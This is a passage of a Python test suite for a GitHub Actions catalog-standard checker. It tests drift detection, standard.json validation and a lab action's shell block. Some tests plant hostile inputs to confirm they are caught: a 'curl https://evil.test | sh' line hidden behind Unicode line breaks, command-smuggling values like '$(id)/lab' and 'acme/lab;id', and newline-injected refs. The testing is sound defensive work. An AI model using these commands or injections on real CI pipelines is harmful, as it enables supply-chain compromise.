        self.assertEqual(standard.normalize(f"- uses: a/b@{sha} #\tv1"), "- uses: a/b@<pin>\n")      # a tab is a blank
        accented = f"- uses: a/b@{sha} # v1 \u00e9"
        self.assertEqual(standard.normalize(accented), accented + "\n")                              # not what Dependabot writes

    def test_a_line_of_a_megabyte_costs_a_fraction_of_a_second(self):
        for text in ("uses: " + "a" * 1000000, "- uses: a/b@" + "a" * 1000000, " " * 1000000 + "x", "x" * 1000000 + "  ", "uses: a/b@" + "a" * 40 + " " * 1000000 + "#" ):
            start = time.process_time()
            standard.normalize(text)
            self.assertLess(time.process_time() - start, 1.0)

    def test_comparable_is_normalize_without_the_number_of_the_marker(self):
        said = "# Managed by the Lab catalog standard 1: change it with catalog.py upgrade, in a pull request a maintainer reads."
        one, two = said + "\nname: x\n", said.replace("standard 1", "standard 2") + "\nname: x\n"
        self.assertNotEqual(standard.normalize(one), standard.normalize(two))
        self.assertEqual(standard.comparable(one), standard.comparable(two))
        self.assertNotEqual(standard.comparable(one), standard.comparable(two.replace("name: x", "name: y")))
        self.assertEqual(standard.comparable("name: x\n" + said + "\n"), standard.normalize("name: x\n" + said + "\n"))
        text = '{\n  "_managed": "Managed by the Lab catalog standard 1: change it with catalog.py upgrade, in a pull request a maintainer reads.",\n  "name": "x"\n}\n'
        self.assertEqual(standard.comparable(text), standard.comparable(text.replace("standard 1", "standard 7")))

    def test_the_pins_a_file_holds_are_read_by_action(self):
        sha, other = "a" * 40, "b" * 40
        text = f"- uses: x/y@{sha} # v1\n- uses: x/y@{other} # v2\n- uses: p/q/r@{other}\n- uses: ./l\n"
        self.assertEqual(standard.pins(text), {"x/y": (sha, "# v1"), "p/q/r": (other, "")})

    def test_pins_are_carried_over_for_the_actions_that_are_there_and_not_for_the_new_ones(self):
        sha, newer, other = "a" * 40, "c" * 40, "b" * 40
        rendered = f"- uses: x/y@{sha} # v1\n- uses: n/ew@{sha} # v3\n"
        current = f"- uses: x/y@{newer} # v2\n- uses: p/q@{other}\n"
        self.assertEqual(standard.carry_pins(rendered, current), f"- uses: x/y@{newer} # v2\n- uses: n/ew@{sha} # v3\n")


class Drift(Case):
    """3.5 and 6.9: against the Lab's render at its level."""

    def check(self, files):
        return standard.drift(tree_of(files))

    def test_a_fresh_catalog_is_clean(self):
        for more in ({}, EVERYTHING):
            self.assertEqual(self.check(render(**more)), [], more)

    def test_a_missing_file_is_sd01_with_the_words_of_section_6(self):
        files = render()
        del files[".github/workflows/ci.yml"]
        found = self.check(files)
        self.assertEqual([(each.code, each.severity, each.path, each.message) for each in found],
                         [("SD01", "error", ".github/workflows/ci.yml", ".github/workflows/ci.yml is missing from the shared files. "
                                                                         "Fix: catalog.py upgrade --write.")])

    def test_each_managed_file_missing_is_found(self):
        for path in [path for path in standard.managed_paths() if path in render() and path != ".github/standard.json"]:
            files = render()
            del files[path]
            self.assertEqual(where(self.check(files), "SD01"), [path], path)

    def test_a_file_edited_by_hand_is_sd02_with_the_words_of_section_6(self):
        files = edited(render(), ".github/workflows/ci.yml", lambda text: text.replace("timeout-minutes: 15", "timeout-minutes: 99", 1))
        found = self.check(files)
        self.assertEqual([(each.code, each.severity, each.path, each.message) for each in found],
                         [("SD02", "error", ".github/workflows/ci.yml", ".github/workflows/ci.yml was edited by hand. Fix: git checkout "
                                                                         "-- .github/workflows/ci.yml. A change to a shared file is "
                                                                         "read by a maintainer.")])

    def test_every_kind_of_managed_file_is_compared(self):
        for path in [path for path in standard.managed_paths() if path in render() and path != ".github/standard.json"]:
            files = edited(render(), path, lambda text: text.replace("\n", "\n# one more\n", 2))
            self.assertEqual(where(self.check(files), "SD02"), [path], path)

    def test_a_pin_bumped_by_dependabot_is_not_drift_and_a_swapped_action_is(self):
        files = edited(render(), ".github/workflows/ci.yml", lambda text: text.replace(
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "9" * 40 + " # v7.9.9"))
        self.assertEqual(self.check(files), [])
        files = edited(render(), ".github/workflows/ci.yml", lambda text: text.replace("actions/checkout@", "actions/checkoutx@", 1))
        self.assertEqual(where(self.check(files), "SD02"), [".github/workflows/ci.yml"])
        files = edited(render(), ".github/actions/lab/action.yml", lambda text: text.replace("docker/", "evil/", 1)
                       if "docker/" in text else text.replace("actions/checkout@", "evil/checkout@", 1))
        self.assertEqual(where(self.check(files), "SD02"), [".github/actions/lab/action.yml"])

    def test_crlf_and_trailing_blanks_are_not_drift(self):
        files = edited(render(), ".github/workflows/ci.yml", lambda text: text.replace("\n", "  \r\n"))
        self.assertEqual(self.check(files), [])

    def test_a_catalog_behind_is_sd03_a_warning_and_a_missing_file_of_a_later_level_is_behind_not_missing(self):
        found = self.check(at(1))
        self.assertEqual(where(found, "SD03"), [".github/rulesets/history.json", ".github/rulesets/tag-history.json",
                                                ".github/workflows/ci.yml", ".github/workflows/nightly.yml"])
        self.assertEqual(codes(found), ["SD03"] * 4)
        self.assertEqual({each.severity for each in found}, {"warning"})
        self.assertIn(".github/workflows/nightly.yml is from standard 1; this Lab has 9. Fix: catalog.py upgrade --write.",
                      [each.message for each in found])

    def test_the_number_of_the_marker_is_the_only_thing_that_is_not_compared(self):
        files = edited(render(), ".catalog/standard.mk", lambda text: text.replace("standard 9:", "standard 1:", 1))
        self.assertEqual(self.check(files), [])
        for change in (lambda text: text.replace("# Managed by the Lab catalog standard 9:", "# Managed by the Lab catalog standard 9 :", 1),
                       lambda text: text.replace("standard 9: change", "standard 9: changed", 1),
                       lambda text: text.replace("catalog standard 9", "catalog standard 99 3", 1)):
            files = edited(render(), ".catalog/standard.mk", change)
            self.assertNotEqual(self.check(files), [])

    def test_the_declared_level_tells_behind_from_edited(self):
        for declared, code in ((9, "SD02"), (1, "SD03")):
            files = edited(render(), ".github/workflows/ci.yml", lambda text: text + "# changed\n")
            files[".github/standard.json"] = files[".github/standard.json"].replace(b'"standard": 9', b'"standard": %d' % declared)
            self.assertEqual(codes(self.check(files)), [code], declared)

    def test_a_declared_level_that_is_stale_while_the_files_are_the_labs_is_no_drift(self):
        files = render()
        files[".github/standard.json"] = files[".github/standard.json"].replace(b'"standard": 9', b'"standard": 1')
        self.assertEqual(self.check(files), [])

    def test_the_images_decide_whether_publish_yml_is_asked_for_and_e2e_is_never_asked_for(self):
        full = render(**EVERYTHING)
        without_both = {path: data for path, data in full.items() if path not in (".github/workflows/publish.yml", ".github/workflows/e2e.yml")}
        found = self.check(without_both)   # catalog.yml names a registry
        self.assertEqual((codes(found), where(found, "SD01")), (["SD01"], [".github/workflows/publish.yml"]))
        self.assertEqual(self.check(render()), [])   # no registry: nothing to publish, nothing missing
        without_e2e = {path: data for path, data in full.items() if path != ".github/workflows/e2e.yml"}
        self.assertEqual(self.check(without_e2e), [])
        edited_e2e = edited(full, ".github/workflows/e2e.yml", lambda text: text + "# x\n")
        self.assertEqual(where(self.check(edited_e2e), "SD02"), [".github/workflows/e2e.yml"])

    def test_a_file_the_catalog_owns_is_info_and_is_not_compared(self):
        files = edited(render(), ".github/dependabot.yml", lambda text: text.split("\n", 1)[1])
        found = self.check(files)
        self.assertEqual([(each.code, each.severity, each.path) for each in found if each.code == "SD08"],
                         [("SD08", "info", ".github/dependabot.yml")])
        self.assertEqual(found[0].message, ".github/dependabot.yml is owned by this catalog; upgrade skips it. WF01 to WF21 still apply.")
        self.assertEqual(codes(found), ["SD08"])   # the copy is a good one: nothing else is said

    def test_a_json_file_is_owned_when_its_marker_key_is_gone(self):
        files = edited(render(), ".github/rulesets/push.json", lambda text: "\n".join(line for line in text.split("\n")
                                                                                       if "_managed" not in line))
        self.assertEqual(where(self.check(files), "SD08"), [".github/rulesets/push.json"])

    def test_an_owned_dependabot_file_needs_github_actions_and_a_cooldown(self):
        mine = "version: 2\nupdates:\n  - package-ecosystem: pip\n    directory: /\n    schedule:\n      interval: weekly\n"
        found = self.check({**render(), ".github/dependabot.yml": mine.encode()})
        self.assertEqual([each.message for each in found if each.code == "SD09"], [".github/dependabot.yml has no github-actions. Fix: add it."])
        withactions = mine + "  - package-ecosystem: github-actions\n    directory: /\n    schedule:\n      interval: weekly\n"
        found = self.check({**render(), ".github/dependabot.yml": withactions.encode()})
        self.assertEqual([each.message for each in found if each.code == "SD09"], [".github/dependabot.yml has no cooldown. Fix: add it."])
        good = withactions + "    cooldown:\n      default-days: 7\n"
        self.assertEqual([each for each in self.check({**render(), ".github/dependabot.yml": good.encode()}) if each.code == "SD09"], [])
        quoted = good.replace("package-ecosystem: github-actions", "package-ecosystem: 'github-actions' # actions")
        self.assertEqual([each for each in self.check({**render(), ".github/dependabot.yml": quoted.encode()}) if each.code == "SD09"], [])
        cooldown_for_pip_only = mine + "    cooldown:\n      default-days: 7\n" + "  - package-ecosystem: github-actions\n    directory: /\n"
        self.assertEqual(len([each for each in self.check({**render(), ".github/dependabot.yml": cooldown_for_pip_only.encode()})
                              if each.code == "SD09"]), 1)

    def test_a_cooldown_in_a_comment_is_no_cooldown(self):
        mine = ("version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    # cooldown: later\n"
                "    schedule:\n      interval: weekly\n")
        found = self.check({**render(), ".github/dependabot.yml": mine.encode()})
        self.assertEqual([each.message for each in found if each.code == "SD09"], [".github/dependabot.yml has no cooldown. Fix: add it."])
        real = mine.replace("# cooldown: later", "cooldown:\n      default-days: 7")
        self.assertEqual([each for each in self.check({**render(), ".github/dependabot.yml": real.encode()}) if each.code == "SD09"], [])

    def test_a_line_hidden_after_a_comment_by_a_line_break_is_found(self):
        pin = re.compile(r"(uses: \S+@[0-9a-f]{40} # v[0-9.]+)\n")
        for sep in ("\u2028", "\u2029", "\u0085"):
            for path in (".github/workflows/ci.yml", ".github/actions/lab/action.yml"):
                files = edited(render(), path, lambda text: pin.sub(lambda found: found.group(1) + sep + "      - run: curl https://evil.test | sh\n",
                                                                   text, count=1))
                self.assertNotEqual(files[path], render()[path])
                self.assertEqual(where(self.check(files), "SD02"), [path], (path, sep))

    def test_a_byte_order_mark_before_the_marker_is_no_way_out_of_the_standard(self):
        for path in (".github/workflows/ci.yml", ".github/rulesets/push.json", ".catalog/standard.mk", ".github/actions/lab/action.yml"):
            text = render()[path].decode()
            self.assertEqual(standard.marker_level("\ufeff" + text, path), standard.LEVEL, path)
            for change in (lambda value: "\ufeff" + value, lambda value: "\ufeff" + value + "# x\n"):
                found = self.check(edited(render(), path, change))
                self.assertEqual((where(found, "SD02"), where(found, "SD08")), ([path], []), path)

    def test_the_makefile_has_to_include_the_standard(self):
        for text in (b"all:\n\ttrue\n", b"# include .catalog/standard.mk\n", b"include .catalog/standard.mkx\n", b"x include .catalog/standard.mk\n"):
            found = self.check({**render(), "Makefile": text})
            self.assertEqual([each.message for each in found if each.code == "SD10"],
                             ["Makefile does not include .catalog/standard.mk. Fix: add the line: include .catalog/standard.mk"], text)
        for text in (b"-include .catalog/standard.mk\n", b"include ./.catalog/standard.mk # the standard\n", b"x:\ny:\n\ninclude .catalog/standard.mk\r\n"):
            self.assertEqual([each for each in self.check({**render(), "Makefile": text}) if each.code == "SD10"], [], text)
        files = render()
        del files["Makefile"]
        self.assertEqual(where(self.check(files), "SD10"), ["Makefile"])

    def test_a_file_a_level_changed_is_behind_below_it_and_edited_by_hand_at_it(self):
        self.assertEqual([(each.code, each.severity, each.path) for each in self.check(at(8))],
                         [("SD03", "warning", ".github/workflows/ci.yml")])
        same = edited(render(), ".github/workflows/ci.yml", lambda text: text.replace("    name: Checks\n", ""))
        self.assertEqual([(each.code, each.severity) for each in self.check(same)], [("SD02", "error")])

    def test_a_level_above_the_labs_is_sd05_once_and_no_file_is_compared(self):
        files = render()
        files[".github/standard.json"] = files[".github/standard.json"].replace(b'"standard": 9', b'"standard": 10')
        files = edited(files, ".github/workflows/ci.yml", lambda text: text + "# changed\n")
        found = self.check(files)
        self.assertEqual([(each.code, each.severity, each.path, each.message) for each in found],
                         [("SD05", "warning", ".github/standard.json", ".github/standard.json says standard 10; this Lab knows 9. Fix: "
                                                                        "update the Lab with git pull, then run again.")])

    def test_standard_json_problems_are_sd04_with_the_words_of_section_6(self):
        cases = {
            b"": "the file is not JSON",
            b"[1]": "the file is not a JSON object",
            b"{": "the file is not JSON",
            b"\xff\xfe": "the file is not UTF-8 text",
            b'{"standard": 1, "standard": 2}': "standard is written twice",
            b'{"standard": NaN}': "it holds a number that is not one",
            b"{" * 20000: "the file is over 4 KB",
        }
        for raw, problem in cases.items():
            files = {**render(), ".github/standard.json": raw}
            found = [each for each in self.check(files) if each.code == "SD04"]
            self.assertEqual([each.message for each in found][:1], [f".github/standard.json: {problem}."], raw[:20])
            self.assertEqual(found[0].severity, "error")

    def test_a_standard_json_of_bad_values_names_each(self):
        base = json.loads(render()[".github/standard.json"])
        bad = {
            "standard": ("standard is a whole number from 1: the level of the managed files in this repository", [0, -1, "1", True, 1.5, 1000]),
            "form": ("form is inline", ["sideways", "reusable", 1, None]),
            "platforms": ("platforms is a list of linux/amd64, linux/arm64 or both", [[], ["linux/riscv64"], "linux/amd64", ["linux/amd64"] * 2]),
            "strict": ("strict is a list of rule codes such as DF22", ["DF22", ["df22"], [5], ["DF22!"], ["X" * 5]]),
            "needs": ("needs is a map of catalog ids to {repository: OWNER/NAME, ref: a full commit}",
                      [[], "hub", {"Hub": {"repository": "a/b", "ref": LAB_COMMIT}}, {"hub": {"repository": "a/b", "ref": "main"}},
                       {"hub": {"repository": "ab", "ref": LAB_COMMIT}}, {"hub": "x"}]),
        }
        for key, (problem, values) in bad.items():
            for value in values:
                files = {**render(), ".github/standard.json": json.dumps({**base, key: value}).encode()}
                messages = [each.message for each in self.check(files) if each.code == "SD04"]
                self.assertIn(f".github/standard.json: {problem}.", messages, (key, value))

    def test_a_need_at_a_full_commit_is_good(self):
        base = json.loads(render()[".github/standard.json"])
        files = {**render(), ".github/standard.json": json.dumps({**base, "needs": {"hub": {"repository": "acme/hub", "ref": LAB_COMMIT}}}).encode()}
        self.assertEqual([each for each in self.check(files) if each.code == "SD04"], [])

    def test_a_lab_that_is_not_an_address_and_a_commit(self):
        base = json.loads(render()[".github/standard.json"])
        for lab, problem in (({"repository": "acme", "ref": LAB_COMMIT}, "lab.repository must be OWNER/NAME of the Lab, letters, digits and . _ - only"),
                             ({"repository": "acme/a\nb", "ref": LAB_COMMIT}, "lab.repository must be OWNER/NAME of the Lab, letters, digits and . _ - only"),
                             ({"repository": "acme/../x", "ref": LAB_COMMIT}, "lab.repository must be OWNER/NAME of the Lab, letters, digits and . _ - only"),
                             ({"repository": "acme/lab", "ref": "main"}, "lab.ref must be a full commit of the Lab, 40 hexadecimal characters"),
                             ({"repository": "acme/lab", "ref": LAB_COMMIT + "\n"}, "lab.ref must be a full commit of the Lab, 40 hexadecimal characters"),
                             ("acme/lab", "lab is an object with repository and ref")):
            files = {**render(), ".github/standard.json": json.dumps({**base, "lab": lab}).encode()}
            self.assertIn(f".github/standard.json: {problem}.", [each.message for each in self.check(files) if each.code == "SD04"], lab)

    def test_an_unknown_key_is_a_warning(self):
        base = json.loads(render()[".github/standard.json"])
        files = {**render(), ".github/standard.json": json.dumps({**base, "color": "red", "lab": {**base["lab"], "x": 1}}).encode()}
        found = [(each.severity, each.message) for each in self.check(files) if each.code == "SD04"]
        self.assertEqual(sorted(found), [("warning", ".github/standard.json: color is not a key of the standard."),
                                         ("warning", ".github/standard.json: lab.x is not a key of the standard.")])

    def test_strict_is_a_good_key(self):
        base = json.loads(render()[".github/standard.json"])
        files = {**render(), ".github/standard.json": json.dumps({**base, "strict": ["DF22", "DF23"]}).encode()}
        self.assertEqual(self.check(files), [])

    def test_without_standard_json_the_files_are_judged_as_the_labs_own_level_and_sd04_is_silent(self):
        files = render()
        del files[".github/standard.json"]
        self.assertEqual(self.check(files), [])
        files = edited(files, ".github/workflows/ci.yml", lambda text: text + "# x\n")
        self.assertEqual(codes(self.check(files)), ["SD02"])

    def test_a_managed_path_that_is_a_link_or_not_a_file_is_sd02(self):
        from lab_ui.catalogs.tree import Entry
        files = render()
        listing = [Entry("100644", path, len(data)) for path, data in files.items() if path != ".github/workflows/ci.yml"]
        listing.append(Entry("120000", ".github/workflows/ci.yml", 12))
        listing.append(Entry("160000", ".catalog/standard.mk", 0))
        listing = [each for each in listing if each.path != ".catalog/standard.mk"] + [Entry("160000", ".catalog/standard.mk", 0)]
        tree = ListTree(listing, lambda path, limit=1048576: files[path] if path in files else None)
        found = standard.drift(tree)
        self.assertEqual(where(found, "SD02"), [".catalog/standard.mk", ".github/workflows/ci.yml"])

    def test_a_managed_file_of_the_template_size_times_ten_is_a_difference_and_costs_little(self):
        huge = edited(render(), ".github/workflows/ci.yml", lambda text: text + ("# " + "x" * 1000000 + "\n"))
        start = time.process_time()
        found = self.check(huge)
        self.assertLess(time.process_time() - start, 3.0)
        self.assertEqual(where(found, "SD02"), [".github/workflows/ci.yml"])

    def test_the_rules_table_has_each_code(self):
        self.assertEqual(sorted(standard.RULES), [f"SD{n:02d}" for n in range(1, 12) if n != 6])


class LabAction(unittest.TestCase):
    """The first `run:` of the managed `lab` action reads standard.json and writes the two lines the checkout reads, or
    nothing. It is taken out of the file that `new` renders and run with bash on hostile inputs."""

    def setUp(self):
        self.text = render()[".github/actions/lab/action.yml"].decode("utf-8")
        self.script = blank(self.text, "id: lab")
        support.need("jq")

    def run_block(self, standard_json, latest="false"):
        with tempfile.TemporaryDirectory() as folder:
            (Path(folder) / "catalog" / ".github").mkdir(parents=True)
            raw = standard_json if isinstance(standard_json, bytes) else json.dumps(standard_json).encode()
            (Path(folder) / "catalog" / ".github" / "standard.json").write_bytes(raw)
            output = Path(folder) / "out"
            output.write_bytes(b"")
            done = support.run_shell(self.script.replace("working-directory: catalog", ""), {"LATEST": latest, "GITHUB_OUTPUT": str(output)},
                                     Path(folder) / "catalog")
            return done.returncode, output.read_text(), done.stdout + done.stderr

    def good(self, **more):
        return {"form": "inline", "lab": {"ref": LAB_COMMIT, "repository": "acme/gravitee-lab"}, "platforms": ["linux/amd64"], "standard": 1, **more}

    def test_a_valid_file_writes_exactly_one_repository_line_and_one_ref_line(self):
        code, written, _ = self.run_block(json.loads(render()[".github/standard.json"]))
        self.assertEqual((code, written), (0, f"repository=acme/gravitee-lab\nref={LAB_COMMIT}\n"))

    def test_latest_writes_an_empty_ref(self):
        code, written, _ = self.run_block(self.good(), latest="true")
        self.assertEqual((code, written), (0, "repository=acme/gravitee-lab\nref=\n"))

    def assert_clean(self, written):
        """Whatever the input was, only a repository line and a ref line made of what the checkout accepts can be there."""
        if written:
            lines = written.split("\n")
            self.assertEqual(len(lines), 3, written)
            self.assertRegex(lines[0], r"^repository=[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$")
            self.assertRegex(lines[1], r"^ref=([0-9a-f]{40})?$")
            self.assertEqual(lines[2], "")

    def test_a_newline_in_a_value_writes_nothing(self):
        for lab in ({"ref": LAB_COMMIT, "repository": "acme/lab\nref=" + "e" * 40}, {"ref": LAB_COMMIT + "\nrepository=evil/x", "repository": "acme/lab"},
                    {"ref": "x\n" + LAB_COMMIT, "repository": "acme/lab"}, {"ref": LAB_COMMIT, "repository": "x\nacme/lab"},
                    {"ref": LAB_COMMIT, "repository": "acme/lab\r"}, {"ref": LAB_COMMIT, "repository": "acme\n/lab"}):
            code, written, said = self.run_block(self.good(lab=lab))
            self.assertEqual((code, written), (1, ""), lab)
            self.assertIn("::error file=.github/standard.json,title=SD04::", said)

    def test_a_newline_at_the_end_of_a_value_is_dropped_by_the_shell_and_never_injects_a_line(self):
        for lab in ({"ref": LAB_COMMIT, "repository": "acme/lab\n"}, {"ref": LAB_COMMIT + "\n", "repository": "acme/lab"}):
            code, written, _ = self.run_block(self.good(lab=lab))
            self.assert_clean(written)
            self.assertEqual(written, f"repository=acme/lab\nref={LAB_COMMIT}\n")

    def test_dot_dot_a_short_commit_a_tag_and_odd_characters_write_nothing(self):
        for lab in ({"ref": LAB_COMMIT, "repository": "acme/.."}, {"ref": LAB_COMMIT, "repository": "../lab"}, {"ref": LAB_COMMIT, "repository": "acme/a..b"},
                    {"ref": LAB_COMMIT[:39], "repository": "acme/lab"}, {"ref": "v1.0.0", "repository": "acme/lab"},
                    {"ref": "main", "repository": "acme/lab"}, {"ref": LAB_COMMIT.upper(), "repository": "acme/lab"},
                    {"ref": LAB_COMMIT, "repository": "acme/lab x"}, {"ref": LAB_COMMIT, "repository": "acme"},
                    {"ref": LAB_COMMIT, "repository": "acme/lab/extra"}, {"ref": LAB_COMMIT, "repository": "$(id)/lab"},
                    {"ref": LAB_COMMIT, "repository": "acme/lab;id"}, {"ref": LAB_COMMIT + "00", "repository": "acme/lab"}):
            code, written, _ = self.run_block(self.good(lab=lab))
            self.assertEqual((code, written), (1, ""), lab)

    def test_a_value_that_is_not_text_writes_nothing(self):
        for lab in ({"ref": 5, "repository": "acme/lab"}, {"ref": LAB_COMMIT, "repository": 5}, {"ref": [LAB_COMMIT], "repository": "acme/lab"},
                    {"ref": None, "repository": "acme/lab"}, {"ref": LAB_COMMIT, "repository": {"a": "b"}}, {"ref": LAB_COMMIT, "repository": True},
                    {}, "text", None, [1]):
            code, written, _ = self.run_block(self.good(lab=lab))
            self.assertNotEqual(code, 0, lab)
            self.assertEqual(written, "", lab)

    def test_an_empty_or_broken_file_writes_nothing(self):
        for raw in (b"", b"{", b"[]", b"null", b"\xff\xfe\x00", b'{"lab":'):
            code, written, _ = self.run_block(raw)
            self.assertNotEqual(code, 0, raw)
            self.assertEqual(written, "", raw)

    def test_a_valid_value_with_other_keys_around_it_is_still_two_lines(self):
        code, written, _ = self.run_block(self.good(form="reusable", strict=["DF22"], color="red"))
        self.assertEqual((code, written), (0, f"repository=acme/gravitee-lab\nref={LAB_COMMIT}\n"))

    def test_the_commit_has_to_be_a_release_of_the_lab_and_a_fake_git_says_so(self):
        """SD11 in CI: the pinned commit is on the Lab's main and a tag vX.Y.Z names it. A commit of main that no release names, a
        tag that is not a version, or a commit that only a fork has, is refused; the nightly run of `latest` asks none of it."""
        script = blank(self.text, "REF: ${{ steps.lab.outputs.ref }}")
        self.assertIn("merge-base --is-ancestor", script)
        self.assertIn("if: ${{ inputs.latest != 'true' }}", self.text.split("name: The commit is a release of the Lab")[1].split("run:")[0])
        with tempfile.TemporaryDirectory() as folder:
            bin_ = Path(folder) / "bin"
            bin_.mkdir()
            record = Path(folder) / "calls"
            (bin_ / "git").write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$RECORD"\n'
                                      'case "$3" in merge-base) [ "$ANSWER" = yes ];; tag) printf "%s" "$TAGS";; esac\n', encoding="utf-8")
            (bin_ / "git").chmod(0o755)
            env = {"PATH": f"{bin_}{os.pathsep}{os.environ.get('PATH', '')}", "RECORD": str(record), "REF": LAB_COMMIT}
            done = support.run_shell(script, {**env, "ANSWER": "yes", "TAGS": "nightly\nv1.5.0\n"}, folder)
            self.assertEqual(done.returncode, 0, done.stderr)
            self.assertEqual(record.read_text(), f"-C lab merge-base --is-ancestor {LAB_COMMIT} refs/remotes/origin/main\n"
                                                 f"-C lab tag --points-at {LAB_COMMIT}\n")
            refused = ("::error file=.github/standard.json,title=SD11::The Lab commit "
                       f"{LAB_COMMIT[:7]} is not a release of the Lab. Fix: pin the latest release (catalog.py upgrade --lab-ref latest).")
            for answer, tags in (("yes", ""), ("yes", "v1.5\nv1.5.0-rc.1\nlatest\n"), ("yes", "v01.5.0\n"), ("no", "v1.5.0\n")):
                with self.subTest(answer=answer, tags=tags):
                    done = support.run_shell(script, {**env, "ANSWER": answer, "TAGS": tags}, folder)
                    self.assertEqual(done.returncode, 1)
                    self.assertIn(refused, done.stdout)


class Aggregator(unittest.TestCase):
    """The `run:` of the job `result` is green for a sane plan and red for a blank one."""

    def setUp(self):
        self.script = blank(render()[".github/workflows/ci.yml"].decode("utf-8"), "name: Catalog CI result", 1)

    def run_plan(self, **env):
        base = {"STATIC": "success", "SEED": "skipped", "COMPILE": "success", "WANT_SEED": "false", "WANT_COMPILE": "true",
                "MATRIX": '{"include":[{"arch":"amd64","platform":"linux/amd64","runner":"ubuntu-24.04"}]}'}
        with tempfile.TemporaryDirectory() as folder:
            return support.run_shell(self.script, {**base, **env}, folder).returncode

    def test_a_sane_plan_is_green(self):
        self.assertEqual(self.run_plan(), 0)
        self.assertEqual(self.run_plan(SEED="success", WANT_SEED="true"), 0)
        self.assertEqual(self.run_plan(COMPILE="skipped", WANT_COMPILE="false", MATRIX=""), 0)

    def test_a_blank_plan_is_red(self):
        self.assertEqual(self.run_plan(WANT_SEED="", WANT_COMPILE=""), 1)
        self.assertEqual(self.run_plan(WANT_COMPILE=""), 1)
        self.assertEqual(self.run_plan(MATRIX=""), 1)

    def test_a_job_the_plan_asked_for_that_did_not_succeed_is_red(self):
        for result in ("skipped", "cancelled", "failure"):
            self.assertEqual(self.run_plan(COMPILE=result), 1, result)
        self.assertEqual(self.run_plan(STATIC="failure"), 1)
        self.assertEqual(self.run_plan(SEED="failure"), 1)


class Commands(Case):
    """`catalog.py new`."""

    def setUp(self):
        support.identity(self)
        self.work = Path(tempfile.mkdtemp(prefix="gravitee-lab-new-")).resolve()
        self.addCleanup(shutil.rmtree, self.work, True)

    def new(self, *more, folder="hub", lab=None):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = standard.main_new([str(self.work / folder), "--id", "acme-hub", "--name", "Acme Hub", *more], lab=lab)
        return code, out.getvalue(), err.getvalue()

    def lab(self, push=True):
        return support.lab_checkout(self, on_origin=push)

    def test_it_creates_the_catalog_and_prints_the_next_steps(self):
        lab = self.lab()
        code, out, err = self.new("--maintainers", "@acme/maintainers", "--license", "Apache-2.0", "--images", "ghcr.io/acme/lab-hub", lab=lab.root)
        self.assertEqual((code, err), (0, ""))
        self.assertEqual(out.split("\n")[0], "Created Acme Hub in " + str(self.work / "hub") + " (standard 9, 32 files)")
        self.assertIn('  1. cd ' + str(self.work / "hub") + ' && git init -b main && git add . && git commit -m "Create the catalog"', out)
        self.assertIn("  2. gh repo create OWNER/hub --private --source . --push", out)
        self.assertIn("  3. make settings                see what GitHub still has to set\n"
                      "     make settings APPLY=1        show the requests that set it\n"
                      "     make settings APPLY=1 YES=1  make them (needs admin rights)\n"
                      "  4. Give the repository its key to the Lab: make settings prints the commands\n"
                      "  5. make dev                     open it in the Lab\n", out)
        files = {str(path.relative_to(self.work / "hub")): path.read_bytes() for path in (self.work / "hub").rglob("*") if path.is_file()}
        self.assertEqual(files, standard.render_new(params(lab_repository="acme/gravitee-lab", lab_ref=lab.git("rev-parse", "HEAD").strip(),
                                                           images="ghcr.io/acme/lab-hub")))

    def test_the_settings_steps_name_commands_the_makefile_runs_and_the_last_one_makes_the_requests(self):
        make = support.need("make")
        import re as _re
        import subprocess
        lab = self.lab()
        code, out, err = self.new("--maintainers", "@a", lab=lab.root)
        self.assertEqual((code, err), (0, ""))
        printed = _re.findall(r"^ +(?:\d\. )?(make settings(?: [A-Z]+=1)*) ", out, _re.M)
        self.assertEqual(printed, ["make settings", "make settings APPLY=1", "make settings APPLY=1 YES=1"])
        said = []
        for command in printed:
            done = subprocess.run([make, "-n", *command.split()[1:]], cwd=str(self.work / "hub"), capture_output=True, text=True,
                                  env={"PATH": os.environ.get("PATH", "")})
            self.assertEqual(done.returncode, 0, done.stderr)
            said.append(done.stdout.strip().split("repo-settings .")[1].strip())
        self.assertEqual(said, ["", "--apply", "--apply --yes"])     # only the last one can make a request: repo-settings asks for --yes

    def test_a_name_the_lab_keeps_stops_new_before_anything_is_made(self):
        self.patch(standard.defaults, "read", return_value=[{"id": "gravitee", "name": "Gravitee public"}])
        for name in ("Official", "this machine", "Gravitee public"):
            code, out, err = self.new("--name", name, "--maintainers", "@a", "--lab-repo", "acme/lab", "--lab-ref", NEWER_COMMIT)
            self.assertEqual((code, out), (2, ""), name)
            self.assertIn("cannot be the name of a catalog", err)
            self.assertEqual(len(err.splitlines()), 1, err)
            self.assertFalse((self.work / "hub").exists())

    def test_a_lab_checkout_with_no_release_on_its_origin_is_a_warning_and_exit_0(self):
        lab = self.lab(push=False)
        code, out, err = self.new("--maintainers", "@a", lab=lab.root)
        self.assertEqual(code, 0)
        self.assertEqual(err, f"The Lab checkout has no release, so CI refuses its commit {lab.git('rev-parse', 'HEAD').strip()[:7]} "
                              "(SD11). Fetch its tags (git fetch --tags), then run catalog.py upgrade --lab-ref latest --write.\n")

    def test_a_new_catalog_is_refused_while_no_release_of_the_lab_ships_its_standard(self):
        lab = self.lab()
        lab.commit({standard.MANIFEST_IN_LAB: support.release_manifest(standard.LEVEL - 1)}, "An older standard")
        release = lab.git("rev-parse", "HEAD").strip()
        lab.git("tag", "v2.0.0", release)
        lab.git("update-ref", "refs/remotes/origin/main", release)
        code, out, err = self.new("--maintainers", "@a", lab=lab.root)
        self.assertEqual((code, out, err), (2, "", f"Standard {standard.LEVEL} is not in a released Gravitee Lab yet. Fix: release "
                                                  "the Lab first, then run this again.\n"))
        self.assertFalse((self.work / "hub").exists())

    def test_the_pin_of_a_new_catalog_is_the_latest_release_of_the_lab_not_its_tip(self):
        lab = self.lab()
        release = lab.git("rev-parse", "HEAD").strip()
        tip = lab.commit({"lab-ui/catalog.py": b"print(2)\n"}, "Not released yet")
        lab.git("update-ref", "refs/remotes/origin/main", tip)
        code, _, err = self.new("--maintainers", "@a", lab=lab.root)
        self.assertEqual((code, err), (0, ""))
        self.assertEqual(json.loads((self.work / "hub" / ".github" / "standard.json").read_text())["lab"]["ref"], release)

    def test_a_new_catalog_yml_has_no_number_to_write_and_the_lines_of_older_labs_say_who_writes_them(self):
        code, _, err = self.new("--maintainers", "@a", lab=self.lab().root)
